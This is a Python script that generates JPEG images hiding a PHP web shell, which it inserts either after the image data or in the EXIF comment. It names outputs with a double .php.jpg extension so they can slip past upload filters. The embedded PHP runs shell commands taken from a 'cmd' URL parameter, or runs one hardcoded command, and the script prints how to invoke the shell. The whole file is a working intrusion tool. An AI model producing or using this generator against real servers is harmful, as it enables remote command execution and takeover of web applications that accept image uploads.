import argparse
from PIL import Image
import io
import subprocess
from datetime import datetime
import sys
import os

def load_template(template_path):
    if not os.path.isfile(template_path):
        print(f"[-] Error: template file not found at: {template_path}")
        sys.exit(1)
    try:
        with open(template_path, "r", encoding="utf-8") as f:
            content = f.read()
        if "{{COMMAND}}" not in content or "{{OUTPUT}}" not in content:
            print(f"[-] Error: template must contain {{COMMAND}} and {{OUTPUT}} placeholders.")
            sys.exit(1)
        return content
    except Exception as e:
        print(f"[-] Error loading template: {e}")
        sys.exit(1)

def build_php_payload(cmd_mode, fixed_cmd=None, template=None):
    template = load_template("template/default.tpl") if not template else load_template(template)

    if cmd_mode == "get":
        command_var = "<?php echo htmlspecialchars($_GET['cmd']); ?>"
        output_block = "<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>"
    elif cmd_mode == "fixed":
        if not fixed_cmd:
            return None
        command_var = fixed_cmd
        output_block = f"<?php system('{fixed_cmd}'); ?>"
    else:
        return None

    return template.replace("{{COMMAND}}", command_var).replace("{{OUTPUT}}", output_block)

def embed_in_image(payload, out_file):
    img = Image.new('RGB', (100, 100), color='white')
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='JPEG')
    img_data = img_bytes.getvalue()
    with open(out_file, 'wb') as f:
        f.write(img_data)
        f.write(b"\n")
        f.write(payload.encode())

def embed_with_exiftool(payload, out_file):
    tmp_img = "temp_payload.jpg"
    img = Image.new('RGB', (100, 100), color='white')
    img.save(tmp_img, format='JPEG')

    if os.path.exists(out_file):
        try:
            os.remove(out_file)
        except Exception as e:
            print(f"[-] Error removing existing output file: {e}")
            sys.exit(1)

    try:
        subprocess.run(
            ["exiftool", f"-Comment={payload}", "-overwrite_original", "-o", out_file, tmp_img],
            check=True
        )
    except subprocess.CalledProcessError as e:
        print(f"[-] Error during exiftool execution: {e}")
        sys.exit(1)

    subprocess.run(["rm", "-f", tmp_img, f"{tmp_img}_original"], check=True)


def main():
    parser = argparse.ArgumentParser(
        description=(
        "Generate a JPG image with embedded PHP payload.\n\n"
        "Arguments:\n"
        "  -m, --method        Payload insertion method: 'inline' (end of file) or 'metadata' (EXIF comment).\n"
        "  -c, --cmd-mode      Command mode: 'fixed' (hardcoded) or 'get' (use ?cmd=COMMAND in URL). Default: get.\n"
        "  -x, --fixed-cmd     Fixed shell command to embed and execute via PHP system().\n"
        "                      Example: -x \"whoami\"\n"
        "                      Required if --cmd-mode=fixed.\n"
        "  -o, --output        Output filename (optional).\n"
        "  -t, --template      Custom template file with placeholders {{COMMAND}} and {{OUTPUT}} (optional).\n"
        "      --show-payload  Display the full generated PHP payload and exit.\n\n"
        "Examples:\n"
        "  python php_jpg_payload_generator.py -m inline -c fixed -x \"whoami\"\n"
        "  python php_jpg_payload_generator.py -m metadata --show-payload\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("-m", "--method", choices=["inline", "metadata"], required=True)
    parser.add_argument("-c", "--cmd-mode", choices=["get", "fixed"], default="get")
    parser.add_argument("-x", "--fixed-cmd")
    parser.add_argument("-o", "--output", default=None)
    parser.add_argument("-t", "--template", help="Path to custom template file", default=None)
    parser.add_argument("--show-payload", action="store_true", help="Print the generated PHP payload to screen and exit. No file will be written.")
    args = parser.parse_args()

    if args.cmd_mode == "fixed" and not args.fixed_cmd:
        print("[-] Error: --fixed-cmd is required when --cmd-mode is 'fixed'.")
        print("[*] Tip: default --cmd-mode is 'get', which supports ?cmd=COMMAND in URL.")
        sys.exit(1)

    php_payload = build_php_payload(args.cmd_mode, args.fixed_cmd, args.template)
    if not php_payload:
        print("[-] Failed to generate payload.")
        sys.exit(1)

    if args.show_payload:
        print("\n[+] Generated PHP payload:\n")
        print(php_payload)
        sys.exit(0)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = args.output or f"jpg_poc_{args.cmd_mode}_{args.method}_{timestamp}.php.jpg"

    try:
        if args.method == "inline":
            embed_in_image(php_payload, filename)
        elif args.method == "metadata":
            embed_with_exiftool(php_payload, filename)
        print(f"[+] File generated: {filename}")
        if args.cmd_mode == "get":
            print(f"[!] Access with: {filename}?cmd=whoami")
        else:
            print(f"[!] Embedded command: {args.fixed_cmd}")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
